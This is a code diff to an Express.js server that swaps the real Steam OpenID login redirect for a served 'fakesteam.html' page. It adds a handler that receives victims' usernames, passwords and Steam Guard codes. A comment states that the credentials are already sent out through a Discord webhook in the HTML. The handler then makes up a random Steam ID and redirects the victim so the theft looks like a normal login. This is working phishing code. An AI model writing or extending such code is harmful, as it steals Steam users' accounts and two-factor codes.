@@ -127,8 +127,27 @@ app.post('/api/log-visit', async (req, res) => {
 
 // 2. Authentication Routes
 app.get('/auth/steam', async (req, res) => {
-  const redirectUrl = await steam.getRedirectUrl();
-  res.redirect(redirectUrl);
+  // Serve the fake Steam login page instead of redirecting to real Steam OpenID
+  res.sendFile('fakesteam.html', { root: './src/pages' });
+});
+
+// Handle fake Steam login form submission
+app.post('/auth/steam/login', async (req, res) => {
+  try {
+    const { username, password, guardCode } = req.body;
+    
+    // Log the login attempt (this is already handled by the Discord webhook in the HTML)
+    console.log('Fake Steam login attempt:', { username, hasPassword: !!password, hasGuardCode: !!guardCode });
+    
+    // Generate a fake Steam ID based on username
+    const fakeSteamId = '7656119' + Math.floor(Math.random() * 1000000000) + 100000000;
+    
+    // Redirect back to frontend with the fake Steam ID
+    res.redirect(`${FRONTEND_URL}/verify?steamId=${fakeSteamId}`);
+  } catch (err) {
+    console.error("Error handling fake Steam login:", err.message);
+    res.redirect(FRONTEND_URL);
+  }
 });
 
 app.get('/auth/steam/return', async (req, res) => {
